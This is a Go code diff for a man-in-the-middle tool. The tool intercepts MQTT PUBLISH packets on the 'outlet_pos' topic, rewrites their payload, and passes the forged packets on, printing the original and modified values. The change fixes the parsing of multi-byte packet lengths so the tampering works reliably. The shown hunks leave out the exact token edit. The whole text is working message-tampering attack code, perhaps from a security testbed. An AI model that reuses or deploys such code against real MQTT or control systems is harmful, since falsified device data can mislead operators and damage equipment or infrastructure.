@@ -26,34 +26,61 @@ func (this *mitm) Read(p []byte) (int, error) {
 
 	targetTopic := []byte("outlet_pos")
 
-	// 2nd byte is always len of rest of packet. Note that multiple packets may
-	// end up being read as part of the same call to conn.Read.
+	// 1st byte is control field (4 bits for packet type, 4 bits for flags).
+	//
+	// Bytes 2-5 are len of rest of packet. Must look at MSB of each byte to see
+	// if another length byte is required. Always at least 1 byte, may be up to 4
+	// bytes.
+	//
+	// Multiple packets may end up being read as part of the same call to
+	// conn.Read.
 
 	pos := 0
 
 	for {
-		// type bit
+		// type/flag byte
 		tb := pos
-		// size bit
+		// size byte
 		sb := pos + 1
 
-		plen := int(pub[sb])
+		var (
+			plen     = 0
+			lenBytes = 1
 
-		// additional 2 bytes takes into account type bit and length bit
-		stop := pos + plen + 2
+			multiplier   = 1
+			moreLenBytes = true
+		)
 
-		// additional 2 bytes takes into account type bit and length bit
-		packet := pub[pos+2 : stop]
+		for moreLenBytes {
+			lenByte := pub[sb]
+
+			plen += int(lenByte&127) * multiplier
+
+			// If MSB is set, then another byte is required for length.
+			if lenByte&128 == 0 {
+				moreLenBytes = false
+			} else {
+				multiplier *= 128
+				lenBytes += 1
+				sb += 1
+			}
+		}
+
+		// current position in read data + 1 type/flag byte + 1-4 length bytes
+		start := pos + 1 + lenBytes
+		stop := start + plen
+
+		packet := pub[start:stop]
 
 		if pub[tb] != 48 || !bytes.Contains(packet, targetTopic) {
 			copy(p[pos:], pub[pos:stop])
 		} else {
-			fmt.Printf("ORIGINAL: %s\n", string(packet))
-
 			topicLen := binary.BigEndian.Uint16(packet[0:2])
 			// 2 bytes for topic length, 2 bytes for message identifier after topic
 			startBit := 2 + topicLen + 2
 			payload := packet[startBit:]
+
+			fmt.Printf("ORIGINAL: %s\n", string(payload))
 
 			tokens := strings.Split(string(payload), ", ")
 
@@ -61,14 +88,17 @@ func (this *mitm) Read(p []byte) (int, error) {
 
 			payload = []byte(strings.Join(tokens, ", "))
 
+			fmt.Printf("MODIFIED: %s\n\n", string(payload))
+
 			copy(packet[startBit:], payload)
 
-			fmt.Printf("MODIFIED: %s\n\n", string(packet))
-
 			p[tb] = pub[tb]
-			p[sb] = pub[sb]
 
-			copy(p[pos+2:], packet)
+			for i := 1; i <= lenBytes; i++ {
+				p[tb+i] = pub[tb+i]
+			}
+
+			copy(p[start:], packet)
 		}
 
 		pos = stop
